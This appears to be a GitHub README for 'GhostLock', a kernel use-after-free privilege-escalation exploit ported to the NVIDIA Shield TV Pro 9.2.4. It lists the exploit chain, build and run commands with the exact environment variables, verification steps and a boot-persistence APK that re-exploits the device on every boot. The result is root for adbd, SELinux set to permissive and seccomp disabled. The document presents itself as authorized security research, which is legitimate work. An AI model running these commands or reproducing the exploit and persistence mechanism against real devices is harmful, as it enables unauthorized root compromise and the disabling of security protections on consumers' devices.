# GhostLock for NVIDIA Shield TV Pro 9.2.4

Validated `arm64` port of the GhostLock futex PI use-after-free
(CVE-2026-43499) for the 2019 NVIDIA Shield TV Pro (`mdarcy`) running Shield
Experience 9.2.4. The payload changes the credentials of the live ADB daemon,
so new ADB shells are UID 0 without a bootloader unlock, userdata wipe, `su`
installation, or verified-partition modification.

> This is a build-specific kernel exploit for authorized security research.
> A mismatch or lost race can panic the kernel. Do not run it on another
> fingerprint, kernel, device, or hardware revision.

## Validated target

| Field | Required value |
| --- | --- |
| Product | NVIDIA Shield TV Pro 2019, `mdarcy` |
| Fingerprint | `NVIDIA/mdarcy/mdarcy:11/RQ1A.210105.003/7825230_4387.0822:user/release-keys` |
| Kernel | `4.9.141-tegra-gb6e5605a` |
| Android patch level | `2026-01-05` |
| Kernel base | `0xffffff8008080000` (offset disabled) |

The port was validated on a locked device with green Verified Boot and
enforcing dm-verity. Those mechanisms remain intact because the exploit
changes only live kernel state.

The 2017 `darcy` Shield TV is also supported and validated; see
[`PORT_STATUS.md`](PORT_STATUS.md).

## Result and lifetime

After a successful run, a fresh connection reports UID/GID 0 for both `adbd`
and its child shell, full capabilities through capability 37, seccomp disabled,
and SELinux permissive. Root survives ADB client disconnects. It does not
survive an `adbd` restart or device reboot by itself.

For practical reboot persistence without modifying verified partitions, the
repository includes a userdata APK. Its non-exported `BOOT_COMPLETED` receiver
starts a short-lived foreground service, which runs the hash-pinned exploit
once per boot from an unprivileged app UID and stops when the runner exits. No
external host is needed after installation. An external Podman watchdog remains
available as a recovery fallback. See
[`persistence/README.md`](persistence/README.md) and
[`watchdog/README.md`](watchdog/README.md).

This is autonomous re-exploitation, not a static firmware patch: every boot has
a short interval in which `adbd` still has its stock credentials. Making
`adbd` start as root before Android initializes it would require changing the
verified boot chain, which is outside this locked, no-wipe design.

## Exploit chain

1. Trigger the vulnerable futex PI rollback path and retain a stale
   `rt_mutex_waiter` on a kernel stack.
2. Stamp the reclaimed stack with `MCAST_BLOCK_SOURCE` and redirect the
   rt-mutex tree operation.
3. Reclaim a freed order-2 `mm_struct` slab page with a shaped skb payload.
4. Redirect `ashmem_misc.fops` to a fake table backed by legacy configfs
   read/write handlers.
5. Walk the task list, locate the requested `adbd` PID, and verify its complete
   credential object.
6. Perform one bounded write over IDs, securebits, and capability words; make
   SELinux permissive; then restore the ashmem operations and boot-ID pointer.

The inherited pipe-buffer physical read/write stage is not used. Detailed
target observations and verified offsets are in [`PORT_STATUS.md`](PORT_STATUS.md).

## Build

The compiler is Android NDK r29 (`aarch64-linux-android30-clang`). Build
directly with an installed Linux NDK:

```sh
cd exploit
make NDK=/opt/android-ndk-r29              # DEVICE=mdarcy by default
make NDK=/opt/android-ndk-r29 DEVICE=darcy
```

Or build the supplied Podman image, which downloads the official r29 Linux
archive and checks its published SHA-1 before extraction:

```sh
podman build -t ghostlock-android:ndk-r29 -f build/Containerfile .
podman run --rm \
  -v "$PWD:/src:Z" \
  -w /src/exploit \
  ghostlock-android:ndk-r29 make -B
```

Output:

```text
exploit/build/preload-mdarcy-9.2.4.so
SHA-256 a3a1e75b627d8dd419e9bafd2a73082a8647510bf6ce4f975e52baf5aa1d0761
```

The Shield build intentionally excludes the reference project's embedded `su`
daemon and wallpaper payload.

## Run

Connect over authorized network ADB, push the release asset or local build,
then enter an ADB shell:

```sh
adb connect SHIELD_ADDRESS:5555
adb -s SHIELD_ADDRESS:5555 push \
  exploit/build/preload-mdarcy-9.2.4.so \
  /data/local/tmp/preload-mdarcy-9.2.4.so
adb -s SHIELD_ADDRESS:5555 shell chmod 0755 \
  /data/local/tmp/preload-mdarcy-9.2.4.so
adb -s SHIELD_ADDRESS:5555 shell
```

Run this inside that device shell:

```sh
GHOSTLOCK_FIXED_BASE=1 \
GHOSTLOCK_MAIN_ROUTE=slide-mcast \
GHOSTLOCK_SLIDE_FULL_LOCK=1 \
GHOSTLOCK_MIXED_ORDER_PAYLOAD=1 \
GHOSTLOCK_MM_PARTIALS=14 \
GHOSTLOCK_BUDDY_HOLD_PAIRS=256 \
GHOSTLOCK_BUDDY_HOLD_SENDS=8192 \
GHOSTLOCK_RECLAIM_PAIRS=64 \
GHOSTLOCK_RECLAIM_SENDS=2048 \
GHOSTLOCK_ADBD_ROOT_CONFIGFS=1 \
GHOSTLOCK_ADBD_PID="$(pidof adbd)" \
LD_PRELOAD=/data/local/tmp/preload-mdarcy-9.2.4.so \
/system/bin/true
```

Disconnect and open a fresh transport for verification:

```sh
adb disconnect SHIELD_ADDRESS:5555
adb connect SHIELD_ADDRESS:5555
adb -s SHIELD_ADDRESS:5555 shell id
adb -s SHIELD_ADDRESS:5555 shell \
  'grep -E "^(Uid|Gid|Cap(Inh|Prm|Eff|Bnd|Amb)|Seccomp):" /proc/$(pidof adbd)/status'
```

The payload refuses to retrigger from an already-UID-0 ADB shell unless
`GHOSTLOCK_FORCE_ROOT_TRIGGER=1` is deliberately supplied. Do not force it;
the privileged scheduling path has different PI behavior and can panic.

## On-device persistence

Download the signed release APK to
`persistence/app/build/ghostlock-boot-mdarcy-9.2.4.apk`, then install and arm it
from an authorized PowerShell ADB host:

```powershell
./persistence/install.ps1 `
  -Target SHIELD_ADDRESS:5555 `
  -AdbPath C:/path/to/platform-tools/adb.exe
```

The installer changes only userdata and does not reboot. At the next
`BOOT_COMPLETED`, the app validates the exact fingerprint, kernel, and embedded
payload hash, records its attempt, and invokes GhostLock from its normal app
UID. A file lock, one-attempt-per-boot state, and a 15-minute cross-boot
cooldown prevent duplicate or reboot-loop attempts. It installs no `su` binary.
Android shows a low-priority `Restoring ADB root` notification only while the
native runner is active; the waiter removes it when the process exits.
See [`persistence/README.md`](persistence/README.md) for build, signing, log,
verification, recovery, and uninstall details.

The final APK was validated with the external watchdog stopped: boot count 134
first exposed stock UID-2000/enforcing `adbd`, and the next fresh transport was
UID/GID 0 with the full `0x3fffffffff` capability mask, seccomp disabled, and
SELinux permissive. The service and notification had cleaned themselves up.

## Logs and recovery

Manual-run diagnostics are synchronously written to
`/sdcard/Download/log_<timestamp>.txt`, falling back to `/data/local/tmp`.
The boot app redirects runner and payload output to its private
`files/boot.log`, readable with `run-as com.cyberbalsa.ghostlockboot`. If the
race panics the kernel, the pre-trigger state prevents another attempt in that
boot count and the 15-minute cooldown carries across the reboot.

## Repository map

- `exploit/src/`: trigger, reclaim, arbitrary read/write, and bounded adbd
  credential patch.
- `exploit/targets/shield-<device>-9.2.4/`: exact build-specific target layout.
- `analysis/`: kernel symbol and layout extraction helpers.
- `persistence/`: on-device boot APK, native runner, and installer.
- `watchdog/`: hash-pinned host-side recovery fallback.
- `report.md`: original OPPO reference-port analysis retained for provenance.

## Credits and license

This port derives from the GhostLock research and exploit framework published
by NebuSec and the OPPO PCKM00 reference port by yijiacloud. KernelSnitch is
embedded under its upstream terms.

- <https://github.com/NebuSec/CyberMeowfia>
- <https://github.com/yijiacloud/GhostLock-OPPO-PCKM00>
- <https://github.com/torvalds/linux/commit/3bfdc63936dd4773109b7b8c280c0f3b5ae7d349>

Apache-2.0; see [`LICENSE`](LICENSE).
